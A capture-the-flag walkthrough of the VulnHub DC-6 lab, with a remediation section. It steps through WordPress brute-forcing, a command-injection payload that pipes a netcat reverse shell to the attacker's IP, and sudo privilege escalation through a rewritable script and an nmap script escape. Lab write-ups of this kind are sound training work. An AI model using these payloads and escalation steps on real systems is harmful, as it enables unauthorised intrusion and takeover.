# VulnHub DC: 6 — Walkthrough

**Hey guys!! \\o/** Who would have thought? Here comes the latest in the DC Series!

Big thanks to **DCAU7** for the whole series. It brought a fresh approach to beginner-level CTFs and still managed to teach me a few new tricks along the way. *(❍ᴥ❍ʋ)*

| Field | Value |
|-------|-------|
| **Level** | Beginner |
| **Target VM** | DC-6 |
| **Attacker VM** | Kali Linux 2019.1 |
| **VulnHub** | https://www.vulnhub.com/entry/dc-6,318/ |
| **Techniques** | WordPress brute-force, Activity Monitor RCE, sudo chain (backups.sh → jens → nmap) |

> **Hint from the author:**
>
> *"You WILL need to edit your hosts file on your pentesting device so that it reads:*
> `192.168.0.x wordy`
> *And yes, it's another WordPress-based VM (although only my second one).*
> *OK, this isn't really a clue, but more 'we don't want you waiting five years for rockyou.txt to finish':*
> ```bash
> cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
> ```
> *That should save you a few years. ;-)"*

---

## Attack Summary

```
[Host Discovery] → [Nmap: SSH+HTTP] → [/etc/hosts: wordy] → [WPScan user enum]
→ [rockyou grep k01 wordlist → brute → mark:helpdesk01]
→ [Activity Monitor plugin → EDB-45274 RCE → reverse shell www-data]
→ [things-to-do.txt → graham:GSo7isUM1D4 → SSH]
→ [sudo backups.sh (owned by jens, group devs) → inject /bin/bash → su jens]
→ [sudo nmap --script → GTFOBins → ROOT]
→ [/root/theflag.txt]
```

---

## Step 1 — Identifying the Target

Let's start by figuring out our network range and finding the target machine on it.

```bash
route -n
```

This gives you the subnet info. Then scan for live hosts:

```bash
nmap -sn -T5 192.168.10.0/24
# or
arp-scan --localnet --ignoredups
```

Now, before doing anything else, we need to add the domain to `/etc/hosts` — otherwise the WordPress site won't load at all (¬_¬):

```bash
echo "192.168.10.190  wordy" >> /etc/hosts
cat /etc/hosts
```

---

## Step 2 — Reconnaissance / Vulnerability Enumeration

Nmap full scan to find ports and services:

```bash
nmap -A -p- 192.168.10.190
```

Expected output:

```
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
```

Only two services: SSH (22) and Apache (80). The author's hint already told us it's WordPress, so let's go check the web application. *(•̀ᴗ•́)*

Without the `/etc/hosts` entry the site won't load. Once you add it, navigate to:

```
http://wordy/
```

Standard WordPress landing page — nothing interesting in the source. Time to enumerate properly.

---

## Step 3 — WordPress Enumeration with WPScan

Since it's WordPress, we go straight to **WPScan**:

```bash
wpscan --url http://wordy/
wpscan -e ap -e at --url http://wordy/
```

The scan shows:
- **WordPress 5.1.1**
- Theme: Twenty Sixteen
- **5 users**: `admin`, `jens`, `graham`, `mark`, `sarah`
- Plugin: **Activity Monitor** (not shown by basic scan — found manually)

No CVEs for this WP version via SearchSploit. But we have **usernames** and the author's wordlist hint. Let's build the wordlist:

```bash
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
wc -l passwords.txt
# ~2668 lines — much faster than the full rockyou.txt ¯\_(ツ)_/¯
```

Now brute-force with WPScan enumerating users:

```bash
wpscan -e u -P passwords.txt --url http://wordy/
```

Result: *( ͡° ͜ʖ ͡°)*

```
[SUCCESS] Username: mark, Password: helpdesk01
```

---

## Step 4 — WordPress Login and Activity Monitor Plugin

Login at `http://wordy/wp-login.php` with:

```
Username: mark
Password: helpdesk01
```

The dashboard doesn't have much. But look at the plugins list — there's one **WPScan didn't catch**: **Activity Monitor**. Let's check SearchSploit:

```bash
searchsploit activity monitor
```

There's an exploit: **EDB-45274** — command injection via the IP field on the Activity Monitor tools page.

```bash
searchsploit -m /usr/share/exploitdb/exploits/php/webapps/45274.html
```

Open the file — it's an HTML form that sends a request to:

```
http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools
```

Edit the file and replace:
- `localhost:8000` → `wordy` (your target IP)
- The payload in the `ip` field: `google.fr | nc -nlvp 127.0.0.1 9999 -e /bin/bash`  
  → Replace with: `google.fr | nc 192.168.10.200 9000 -e /bin/bash`

Where `192.168.10.200` is your Kali IP and `9000` is your listener port.

---

## Step 5 — Reverse Shell as www-data

Start your listener:

```bash
nc -lnvp 9000
```

Open the modified HTML file in Firefox:

```
file:///root/Downloads/DC6/45274.html
```

Make sure you're still logged in as `mark` in the same browser. Click **Submit request**.

**Bingo!! (☞ﾟヮﾟ)☞** Reverse shell received!

Upgrade to interactive shell:

```bash
python -c "import pty;pty.spawn('/bin/bash')"
export TERM=screen
```

You're now `www-data`. Time to look around.

---

## Step 6 — Lateral Movement: www-data → graham

Explore home directories:

```bash
ls -lhaR /home/
```

You'll find two interesting files:

```
/home/jens/backups.sh     (rwxrwxr-x — group devs can edit!)
/home/mark/stuff/things-to-do.txt
```

Read `things-to-do.txt`:

```bash
cat /home/mark/stuff/things-to-do.txt
```

```
- Add new user: graham - GSo7isUM1D4 - done
```

*( ͡° ͜ʖ ͡°)* Credentials in plain text. Classic.

Switch to `graham` or SSH in:

```bash
ssh graham@192.168.10.190
# Password: GSo7isUM1D4
```

---

## Step 7 — Privilege Escalation: graham → jens → root

Check sudo permissions for `graham`:

```bash
sudo -l
```

```
User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
```

`graham` can run `backups.sh` as `jens` without a password! And `backups.sh` is writable by group `devs`. Check if `graham` is in `devs`:

```bash
id
# uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)
```

**┬──┬◡ﾉ(° -°ﾉ) Bingo!!** `graham` is in `devs` and can edit that script!

Overwrite `backups.sh` with a shell spawn:

```bash
echo "#!/bin/bash" > /home/jens/backups.sh
echo "/bin/bash" >> /home/jens/backups.sh
cat /home/jens/backups.sh
```

Execute it as `jens`:

```bash
sudo -u jens /home/jens/backups.sh
whoami
# jens
```

Now check `jens`'s sudo:

```bash
sudo -l
```

```
User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap
```

**`nmap` with sudo and no password!** GTFOBins has exactly what we need:

```bash
echo 'os.execute("/bin/sh")' > /tmp/xpl
sudo nmap --script=/tmp/xpl
```

```
# whoami
root
```

**Maravilha!! ;) Got root!! :D**

---

## Step 8 — Reading the Flag

```bash
ls -lh /root/
cat /root/theflag.txt
```

```
Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to add, this was a lot
harder to get right than I first thought it would be, yadda,
yadda, yadda.

Anyway, I hope you enjoyed it and learned a few things along
the way. If you want to let me know what you thought, send me
a tweet via @DCAU7.
```

**(☞ﾟヮﾟ)☞ More DC series completed!! Well Done guys!! ;)**

---

## Lessons Learned

| # | Finding | Key Takeaway |
|---|---------|-------------|
| 1 | Targeted wordlist (rockyou grep k01) | Not all brute-force needs to be brute — author hints matter |
| 2 | WPScan missed Activity Monitor plugin | Always enumerate manually too, not only automated tools |
| 3 | Credential in `things-to-do.txt` | Developers leaving credentials in TODO files — very common |
| 4 | Group `devs` writable script + sudo | Writable scripts executed by higher-privilege sudo = PE |
| 5 | `nmap` GTFOBins sudo escape | Always check GTFOBins for any sudo-allowed binary |

---

## Remediation

1. **Never store credentials in plaintext files** — use a password manager or secrets manager
2. **Restrict wordlist creation** — don't hint the pattern of valid passwords in machine notes
3. **Remove world/group-writable permissions on sudo-executed scripts** — `chmod 750 /home/jens/backups.sh`
4. **Limit sudo scope** — don't allow `nmap` via sudo; it's a GTFOBins escape
5. **Keep WordPress plugins updated** and audit installed plugins for known CVEs

---

## Final Thoughts

Thanks to DCAU7 for the challenge!

The DC series always delivers a solid learning experience. This one reinforced the importance of reading ALL the files you encounter — that `things-to-do.txt` is the kind of finding that separates a thorough pentester from someone who skips the boring parts. And the `nmap` GTFOBins escape is a beautiful example of how "safe" tools can become dangerous when combined with sudo and no password. ¯\_(ツ)_/¯

If this walkthrough helped you, share it with your crew and keep hacking! *Thanks guys!! (❍ᴥ❍ʋ)*

> **Original article by André Henrique** (Portuguese): [VulnHub DC Serie: 6 (Walkthrough)](https://medium.com/@mrhenrike/vulnhub-dc-serie-6-walkthrough-35d2f712487)
